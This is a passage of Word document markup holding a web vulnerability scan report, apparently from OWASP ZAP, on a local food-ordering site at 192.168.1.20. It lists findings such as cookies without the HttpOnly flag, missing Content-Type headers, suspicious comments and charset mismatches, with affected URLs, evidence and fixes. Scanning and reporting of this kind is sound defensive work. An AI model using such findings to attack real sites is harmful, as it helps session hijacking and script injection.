            <w:r w:rsidRPr="00DA102C">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:color w:val="000000"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Cookie No HttpOnly Flag</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5ACFCD6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45C5E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66AB75B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 cookie has been set without the HttpOnly flag, which means that the cookie can be accessed by JavaScript. If a malicious script can be run on this page then the cookie will be accessible and can be transmitted to another site. If this is a session cookie then session hijacking may be possible.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3D951767" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="2"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="71073BFC" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="16BBB32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BAF90C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951EB4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http://192.168.1.20/member-index.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5A978A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9D38C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3B53AA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4B15E7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2A68A8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A1D64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7E17BCD5"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383244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914629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247679E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FB420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C4169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3617713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02F5DC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42D3A0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31B277B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C5F029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3F2B9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3AA9D32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6A7D70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0FF1648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6A1DE2E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0173A2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61F4EC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http://192.168.1.20/admin/login-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="552531B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795F9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FA2D72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0FA0470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EF0E9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4B40CA5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725DBFE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2D27B7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2FD7517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77B6E345"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199356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DA17F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6BFCAF0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E39C54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9520E5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3AF4F15A"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7D3FC8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7A8AD4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SecretCookie</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4D91825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1DBD7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Evidence</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="49DD65A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SecretCookie</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7FA15A2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243540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BFB38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http://192.168.1.20/login-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="17711EB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C0D77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BA6575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F2B60B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9B3125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15D45E1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SecretCookie</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4447BBF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E293E3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5F43BA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SecretCookie</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="26BBFAC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F0377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2FA487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http://192.168.1.20/cart-exec.php?id=1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="532F245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49007C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485FC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7FF2C3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29141F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Parameter</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="299C9B5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PHPSESSID</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2A3A81E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34F55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Evidence</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6598993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Set-Cookie: PHPSESSID</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="679D2784"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195B0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0690446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6</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1BA07041"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301D5B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48706A0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that the HttpOnly flag is set for all cookies.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2CEEBAF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4FF1BB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79D64A5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https://owasp.org/www-community/HttpOnly</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7698B454"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D870A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20A1B49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16</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="74D81DA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B4AE74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6398B80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13</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5382607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1F6BC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11B122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4BBB061A"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0F86644C" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:trHeight w:val="360"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0000FF"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="60E5E39E" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:bookmarkStart w:id="79" w:name="info" w:colFirst="0" w:colLast="0"/>
            <w:r w:rsidRPr="00DA102C">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Informational (Medium)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0000FF"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6E5A0BD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Content-Type Header Missing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="419086A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1C27BD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0D16DF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Content-Type header was either missing or empty.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="43A00850" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="2"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="608AB073" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2CA60F1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D6BCB6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B677FF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http://192.168.1.20/images/pizza/Romans.xcf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="70514A8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9C9FD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8AD02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230741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9A46DD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34169A7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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1DF0775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7E34E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66531F9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Ensure each page is setting the specific and appropriate content-type value for the content being delivered.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5675568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D2026D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457FE4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http://msdn.microsoft.com/en-us/library/ie/gg622941%28v=vs.85%29.aspx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2AB32D6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E857F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1274ECF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345</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4C8AE6A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6E082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5DF9A06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12</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="23F1C87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7BF9C1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5CD2F44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0DA46F6D"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4A20D100" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:trHeight w:val="360"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0000FF"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="785355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Informational (Low)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0000FF"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2FF7A27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Information Disclosure - Suspicious Comments</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="63E8BB9B"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7FECD0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350D8D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response appears to contain suspicious comments which may help an attacker. Note: Matches made within script blocks or files are against the entire content not only comments.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1DDAF8DB" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="2"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="727216A0" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0E54BA9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4899F6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EB62FC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http://192.168.1.20/admin/allocation.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6893EFB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871B0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123E1A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5FD58E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E6161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8F1F97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http://192.168.1.20/admin/foods.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1DE163C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349432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CA12A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0392AA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ABCC66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713DE0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http://192.168.1.20/admin/specials.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4D070F7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C2705E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01ABE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1F4BB5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2EA36B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URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0E4180B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http://192.168.1.20/ratings.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="413EB94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4C3A29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04063B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01894BF"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E55AE8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81671C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http://192.168.1.20/js/jquery.js</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="01098B8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A0F43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6AF602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3BAF45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63A39B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2C6125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http://192.168.1.20/inbox.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2BDC5BC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63B974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728309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0156E6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FBAD6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DD56F2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http://192.168.1.20/admin/options.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4C43A49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139336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A766D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3CFB6C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A0EB05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08EDD6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http://192.168.1.20/register-failed.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4581132B"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2A45A7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62E9E7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FF55B0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3C922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637A65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http://192.168.1.20/admin/login-form.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1400235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2B20C4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38F1A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1281219"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459748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6D9809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http://192.168.1.20/billing-alternative.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="03205511"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94B4E1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8FF3EF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AB011F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A6C28E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269AA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http://192.168.1.20/member-profile.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7730A39D"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FADE99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DE78D9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2B7F75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001A73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A79838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http://192.168.1.20/admin/messages.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1B0E76F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6986CB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08EA2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740D2A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4F75D3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0BEEA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http://192.168.1.20/js/bootstrap.js</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="68F1642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CDEBAF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7B7958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6C4AAFA"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F9BA71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165504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http://192.168.1.20/foodzone.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2A75DA6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1DFF8B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8561B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2528E9D6"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6483AB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C02740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http://192.168.1.20/index.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="71E782A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D9F754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96424E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1211900"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98C6CB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B33110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http://192.168.1.20/admin/validation/admin.js</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="48A85F6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DC8FEB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2E0E4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839359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E5FB2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85677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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3CAB5BC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5C96EE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BB011E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75CBDDE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4ECB6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81341B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http://192.168.1.20/foodzone.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="764D889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90C75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E0B65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POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="27F6B79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77F0E1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04D13A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http://192.168.1.20/tables.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7B62A877"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EEE0D3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D7E251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7287A0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2E5E2C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838D3F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http://192.168.1.20/validation/user.js</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7CD7B5D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6DD58F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4AA1AE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7F0848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A68A8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1C230E8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31</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3DE21FE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311990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Solution</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3CD7CD0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Remove all comments that return information that may help an attacker and fix any underlying problems they refer to.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="69DEA56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26ED98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Other information</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="03EE6B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 following comment/snippet was identified via the pattern: \bADMIN\b</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CAF816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 language="JavaScript" src="validation/admin.js"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2404DE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&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1D2A8DE6" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="2"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D7B459E" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3E15A0CF"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4927FA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033908DC" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7EA1592E"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5EC70A9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14EDB76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200</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2216CF02"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EE742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58ED490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13</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="032B0D58"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0104E2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6C93F50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25ABA4B0" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:vanish/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-GB"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9"/>
        <w:gridCol w:w="7461"/>
      </w:tblGrid>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5CF3486D" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:trHeight w:val="360"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0000FF"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="44D9C4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Informational (Low)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0000FF"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="716223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Charset Mismatch (Header Versus Meta Content-Type Charset)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:bookmarkEnd w:id="79"/>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="77F60AC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C2E6CD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Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1C13506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This check identifies responses where the HTTP Content-Type header declares a charset different from the charset defined by the body of the HTML or XML. When there's a charset mismatch between the HTTP header and content body Web browsers can be forced into an undesirable content-sniffing mode to determine the content's correct character set.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BFF308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An attacker could manipulate content on the page to be interpreted in an encoding of their choice. For example, if an attacker can control content at the beginning of the page, they could inject script using UTF-7 encoded text and manipulate some browsers into interpreting that text.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1CD7E703" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="2"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="35085CAB" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="51FB4C3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1C61E3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882837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http://192.168.1.20/admin/access-denied.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="23B0DF6F"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0A8CD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6E82A7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A2ADC7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378698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D74854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http://192.168.1.20/admin/messages.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7E66FEEC"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957FC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F8AE45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2D8C244"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504EA6B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45E5B1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http://192.168.1.20/reset-failed.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2702798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30A186F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3FC2960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E7C1AB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4FC70C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3805CF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http://192.168.1.20/access-denied.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4067013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A18EEC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98C8F6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8599DF7"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AA78DA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8F2094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http://192.168.1.20/inbox.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6927E0C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10DCBA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494B4F2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E61CEC3"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9E653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424446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http://192.168.1.20/admin/logout.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
